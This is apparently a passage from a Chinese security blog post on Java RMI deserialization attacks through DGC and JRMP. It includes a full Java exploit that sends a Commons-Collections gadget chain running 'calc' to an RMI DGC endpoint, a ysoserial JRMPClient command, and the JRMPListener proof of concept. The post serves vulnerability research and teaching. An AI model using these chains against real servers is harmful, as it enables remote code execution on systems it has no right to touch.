<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.rmi.dgc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DGC</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    Lease <span class="title function_">dirty</span><span class="params">(ObjID[] ids, <span class="type">long</span> sequenceNum, Lease lease)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">(ObjID[] ids, <span class="type">long</span> sequenceNum, VMID vmid, <span class="type">boolean</span> strong)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当client远程引用对象时，例如<code>lookup</code>，就会调用dirty方法，返回租约对象</li>
<li>当客户端不再持有远程引用的对象时，触发clean来清除这个远程引用</li>
</ul>
<p>并且有两个类实现了这个接口<code>sun.rmi.transport.DGCImpl&amp;sun.rmi.transport.DGCImpl_Stub</code>，同时还定义了<code>sun.rmi.transport.DGCImpl_Skel</code>。这几个类其实和<code>Registry</code>类似，DGC通信的处理类是<code>DGCImpl_Skel</code>，通过<code>dispatch</code>方法来处理<code>dirty</code>和<code>clean</code>两个方法</p>
<img src="/2024/11/30/RMI反序列化/image-20241116124237761.png"  alt="image-20241116124237761" style="zoom:67%;" />

<img src="/2024/11/30/RMI反序列化/image-20241116124259368.png"  alt="image-20241116124259368" style="zoom:67%;" />

<p>两个方法都涉及到<code>readObject</code>操作，也就是说都有被攻击的可能。所以我们的目标就是构造DGC通信并且在指定位置写入序列化后的恶意类，思路就是获取<code>DGCImpl_Stub</code>对象，重写<code>dirty&amp;clean</code>，然后在<code>DGcImpl_Skel</code>处进行反序列化，和利用<code>lookup&amp;unbind</code>攻击registry的思路差不多，这里以重写dirty为例，把halfblue师傅的exp拿来完善了一下<a href='[RMI反序列化漏洞之三顾茅庐-攻击实现 | Halfblue](https://halfblue.github.io/2021/11/02/RMI反序列化漏洞之三顾茅庐-攻击实现/)'>文章地址</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dgc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> demo1.EvilClientdemo1;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.Endpoint;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DGCExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC6</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass=LazyMap.class;</span><br><span class="line">        Field factoryField=lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> expMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RegistryImpl_Stub</span> <span class="variable">registry</span> <span class="operator">=</span> (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> unicastRef.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField2</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> (LiveRef) refField2.get(unicastRef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> liveRef.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">epField</span> <span class="operator">=</span> c3.getDeclaredField(<span class="string">&quot;ep&quot;</span>);</span><br><span class="line">        epField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> (TCPEndpoint) epField.get(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.rmi.transport.DGCClient$EndpointEntry&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">lookupMethod</span> <span class="operator">=</span> c4.getDeclaredMethod(<span class="string">&quot;lookup&quot;</span>, Endpoint.class);</span><br><span class="line">        lookupMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">endpointEntry</span> <span class="operator">=</span> lookupMethod.invoke(<span class="literal">null</span>, tcpEndpoint);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> endpointEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dgcField</span> <span class="operator">=</span> c5.getDeclaredField(<span class="string">&quot;dgc&quot;</span>);</span><br><span class="line">        dgcField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">RemoteObject</span> <span class="variable">dgc</span> <span class="operator">=</span> (RemoteObject) dgcField.get(endpointEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c6</span> <span class="operator">=</span> dgc.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField3</span> <span class="operator">=</span> c6.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef2</span> <span class="operator">=</span> (UnicastRef) refField3.get(dgc);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> unicastRef2.newCall(dgc, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">        var6.writeObject(CC6());</span><br><span class="line">        unicastRef2.invoke(var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>server端开启后</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241116170701406.png" class="" title="image-20241116170701406">

<p>ysoserial里也有对应的exp，里面的实现方法是用socket重写jrmp协议。<code>JRMPClient</code>模块的攻击目标就是DGC</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\ysoserial<span class="literal">-all</span>.jar ysoserial.exploit.JRMPClient localhost <span class="number">1099</span> CommonsCollections1 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241116165003275.png" class="" title="image-20241116165003275">

<h1 id="0x02JRMP反序列化"><a href="#0x02JRMP反序列化" class="headerlink" title="0x02JRMP反序列化"></a>0x02JRMP反序列化</h1><p>RMI的一些类可以用来组成反序列化利用链</p>
<h2 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h2><p><code>UnicastRemoteObject</code>是远程调用接口实现类的父类，我们在创建远程对象的时候，实际上就会调用<code>UnicastRemoteObject#exportObject</code>将其暴露在网络中并随机监听一个端口</p>
<p>所以在反序列化<code>UnicastRemoteObject</code>及其子类后，依然需要执行<code>exportObject</code>方法，我们注意到它的<code>readObject</code>方法</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241116174841438.png" class="" title="image-20241116174841438">

<p>里面调用了<code>reexport()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241116174920679.png" class="" title="image-20241116174920679">

<p>然后直接调用<code>exportObject</code>方法，触发 JRMP 监听端口，并会对请求进行解析和反序列化操作，那就可以配合 DGC 的处理逻辑来进行攻击。这条链子就是<code>ysoserial.payloads.JRMPListener</code></p>
<p><code>GadgetChain</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* Gadget chain:</span><br><span class="line">* UnicastRemoteObject.readObject(ObjectInputStream) line: 235</span><br><span class="line">* UnicastRemoteObject.reexport() line: 266</span><br><span class="line">* UnicastRemoteObject.exportObject(Remote, int) line: 320</span><br><span class="line">* UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383</span><br><span class="line">* UnicastServerRef.exportObject(Remote, Object, boolean) line: 208</span><br><span class="line">* LiveRef.exportObject(Target) line: 147</span><br><span class="line">* TCPEndpoint.exportObject(Target) line: 411</span><br><span class="line">* TCPTransport.exportObject(Target) line: 249</span><br><span class="line">* TCPTransport.listen() line: 319</span><br></pre></td></tr></table></figure>

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPListener</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> UnicastRemoteObject <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">jrmpPort</span> <span class="operator">=</span> Integer.parseInt(command);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">uro</span> <span class="operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            RemoteRef.class</span><br><span class="line">        &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(jrmpPort)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, <span class="string">&quot;port&quot;</span>).set(uro, jrmpPort);</span><br><span class="line">        <span class="keyword">return</span> uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(JRMPListener.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有关<code>createWithConstructor()</code>方法的定义如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">    setAccessible(objCons);</span><br><span class="line">    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">    setAccessible(sc);</span><br><span class="line">    <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ysoserial.payloads.JRMPListener</code>中调用<code>createWithConstructor</code>就是创建了一个<code>ActivationGroupImpl</code>实例，然后再向上转型为<code>UnicastRemoteObject</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241118184222239.png" class="" title="image-20241118184222239">

<p>根据上面这些我们写出poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> unicastremoteobject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.ActivationGroupImpl;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastServerRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">int</span> jrmpPort=<span class="number">1099</span>;</span><br><span class="line">        UnicastRemoteObject uro=createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            RemoteRef.class</span><br><span class="line">        &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(jrmpPort)</span><br><span class="line">        &#125;);</span><br><span class="line">        Field field=UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(uro,jrmpPort);</span><br><span class="line">        serialize(uro);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时我们查看端口占用情况：</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120190117688.png" class="" title="image-20241120190117688">

<h3 id="exploit-JRMPClient-payload-JRMPListener客户端打服务端"><a href="#exploit-JRMPClient-payload-JRMPListener客户端打服务端" class="headerlink" title="exploit/JRMPClient+payload/JRMPListener客户端打服务端"></a><code>exploit/JRMPClient</code>+<code>payload/JRMPListener</code>客户端打服务端</h3><p>这样就已经开启一个rmi服务了，此时我们可以通过ysoserial的<code>exploit/JRMPClient</code>进行攻击，前面我们也提到过<code>exploit/JRMPClient</code>实际上攻击的是DGC，只要开启了RMI服务，都会存在DGC的</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120192440760.png" class="" title="image-20241120192440760">

<h2 id="UnicastRef"><a href="#UnicastRef" class="headerlink" title="UnicastRef"></a>UnicastRef</h2><p><code>UnicastRef</code>继承了<code>Externalizable</code>，里面重写了<code>readExternal</code>这个方法</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120194219830.png" class="" title="image-20241120194219830">

<p>然后跟进<code>LiveRef#read()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120195448507.png" class="" title="image-20241120195448507">

<p>在这里会调用<code>DGCClient#registerRefs()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120195544180.png" class="" title="image-20241120195544180">

<p>然后接着调用同名方法<code>DGCClient$EndpointEntry#registerRefs()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120195849133.png" class="" title="image-20241120195849133">

<p>最后会调用<code>makeDirtyCall()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120200022500.png" class="" title="image-20241120200022500">

<p>这里又会调用<code>DGCImpl_Stub#dirty()</code>，涉及到反序列化操作。</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241120200338733.png" class="" title="image-20241120200338733">

<p>所以在<code>UnicastRef</code>被反序列化的时候，会启动DGC通信，如果此时传入恶意的序列化数据，当<code>DGCImpl_Stub#dirty</code>被调用的时候，就会造成反序列化漏洞</p>
<p><code>GadgetChain</code>如下，这条链子实际上就是ysoserial中的<code>payloads/JRMPClient</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UnicastRef#readExternal()</span><br><span class="line">	LiveRef#read()</span><br><span class="line">		DGCClient#registerRefs()</span><br><span class="line">			DGCClient$EndpointEntry#registerRefs()</span><br><span class="line">				DGCImpl_Stub#dirty()</span><br><span class="line">					//开启JRMP服务</span><br><span class="line">					ObjectInputStream#readObject()</span><br></pre></td></tr></table></figure>

<p>把<code>ysoserial/payloads/JRMPClient</code>的代码稍微整合一下</p>
